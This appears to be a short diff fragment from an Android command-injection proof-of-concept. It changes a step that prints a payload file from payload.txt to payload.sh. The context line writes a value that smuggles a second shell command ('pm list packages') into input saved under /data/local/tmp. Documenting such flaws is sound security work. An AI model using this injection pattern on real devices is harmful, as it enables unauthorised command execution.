@@ -34,4 +34,4 @@ echo "A';pm list packages>/data/local/tmp/cmi_proof.sh;'" > /data/local/tmp/payl
 
 # After you do the above steps, you run:
 ls -la /data/local/tmp
-cat /data/local/tmp/payload.txt
+cat /data/local/tmp/payload.sh
